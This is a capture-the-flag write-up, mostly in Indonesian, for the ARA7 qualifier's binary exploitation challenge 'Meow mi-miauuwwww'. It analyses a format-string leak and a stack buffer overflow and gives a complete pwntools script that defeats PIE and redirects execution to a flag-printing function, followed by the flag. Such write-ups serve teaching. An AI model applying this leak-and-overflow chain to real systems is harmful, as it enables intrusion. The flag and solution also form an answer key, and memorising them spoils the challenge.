# Writeup: Meow mi-miauuwwww

**Event:** ARA7 Qualification  
**Category:** Binary Exploitation (PWN)  
**Solved by:** demtcsre (Ahmad Rizki Daffaa)  
**Flag:** `ARA7{ada_seorang_pria_lokal_menikahi_pohon_saw17}`

---

## Analisis Awal

```bash
$ file meow
meow: ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped

$ checksec meow
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
SHSTK:    Enabled
IBT:      Enabled
Stripped: No
```

**Security Summary:**
- **No Stack Canary** → Binary sangat rentan terhadap stack buffer overflow.
- **NX Enabled** → Tidak bisa jalankan custom shellcode di stack.
- **PIE Enabled** → Alamat binary berubah setiap kali dijalankan, perlu leak.
- **Full RELRO** → Tidak bisa overwrite GOT.

---

## Fungsi-Fungsi Penting (via Ghidra)

### `meow()` — Target Function

```c
void meow(void) {
    char local_98 [136];
    FILE *local_10;

    local_10 = fopen("flag.txt", "r");
    if (local_10 == (FILE *)0x0) {
        puts("Meow? (Flag filenya mana?)");
        exit(1);
    }
    fgets(local_98, 0x80, local_10);
    printf("\n NYAAAA! Meow Meow: %s\n", local_98);
    fclose(local_10);
    exit(0);
}
```

### `mi_miauw()` — Fungsi Rentan

```c
void mi_miauw(void) {
    int local_4c;
    char local_48 [64];

    puts("=== MEOW MEOW ===");
    puts("1. Meow me..ow (Melihat Alamat)");
    puts("2. Meow MEOOWWW (Nyakar Memori)");
    printf("meow meow meow ^^: ");
    __isoc99_scanf(&DAT_001020b4, &local_4c);
    getchar();

    if (local_4c == 1) {
        puts("Meow meow? (Kasih Mize sesuatu buat diintip: )");
        fgets(local_48, 0x40, stdin);
        printf("Meow, ");
        printf(local_48);   // <-- FORMAT STRING VULNERABILITY
    } else if (local_4c == 2) {
        puts("Meow meow RAWRRRRR! (Mize masih lapar, RUAAAAA!!!!)");
        fgets(local_48, 0x100, stdin);   // <-- BUFFER OVERFLOW (64 byte buf, 256 byte read)
    }
}
```

---

## Identifikasi Vulnerability

- **Vulnerability A (Option 1) — Format String:** `printf(local_48)` tanpa format specifier → bisa leak stack addresses untuk bypass PIE.
- **Vulnerability B (Option 2) — Buffer Overflow:** Buffer `local_48` hanya 64 byte, tapi `fgets` membaca hingga 256 byte → bisa overwrite Saved Return Address.

---

## Proses Menemukan Magic Numbers

### 1. Format String Offset (Leak Offset)

```
AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
```

Dari stack dump di GDB (`x/24gx $rsp`):
- `AAAA` (0x41414141) muncul di posisi argumen ke-9.
- Saved Return Address berada 9 slot lebih jauh.
- Kalkulasi: 9 + 9 = 18 → pada eksekusi live, environment variables menggeser ke **Offset 17**.

### 2. PIE Base Offset

Alamat yang di-leak selalu berakhir `...417`. Dari `disas main`, instruksi setelah `call mi_miauw` berada di `0x1417`.

```
PIE Base = Leaked Value - 0x1417
```

### 3. Buffer Padding

Dari disassembly `mi_miauw`:
- `local_48` buffer: `rbp - 0x40` = 64 bytes
- Saved RBP: 8 bytes
- **Total padding = 64 + 8 = 72 bytes**

### 4. Stack Alignment Fix

Saat testing, exploit redirect ke `meow()` tetapi crash karena 64-bit Linux memerlukan stack 16-byte aligned ketika memanggil `fopen`. Solusi: tambahkan gadget `ret` sebelum alamat `meow`.

---

## Exploit Script

```python
from pwn import *

exe = './meow'
elf = ELF(exe)
context.binary = elf
p = remote('chall-ctf.ara-its.id', 54317)

# Stage 1: Leak PIE
p.sendlineafter(b'meow meow meow ^^: ', b'1')
p.sendlineafter(b'intip: )', b'%17$p')
p.recvuntil(b'Meow, ')
leaked_addr = int(p.recvline().strip(), 16)

elf.address = leaked_addr - 0x1417
log.success(f"PIE Base: {hex(elf.address)}")

# Stage 2: Buffer Overflow
p.sendlineafter(b'meow meow meow ^^: ', b'2')

rop = ROP(elf)
ret = rop.find_gadget(['ret'])[0]
payload = b'A' * 72 + p64(ret) + p64(elf.symbols['meow'])
p.sendlineafter(b'RUAAAAA!!!!)', payload)

p.interactive()
```

**Output:**
```
[+] PIE Base: 0x5d946d38c000
[*] Loaded 5 cached gadgets for './meow'
[*] Switching to interactive mode

 NYAAAA! Meow Meow: ARA7{ada_seorang_pria_lokal_menikahi_pohon_saw17}
```

---

## Flag

```
ARA7{ada_seorang_pria_lokal_menikahi_pohon_saw17}
```
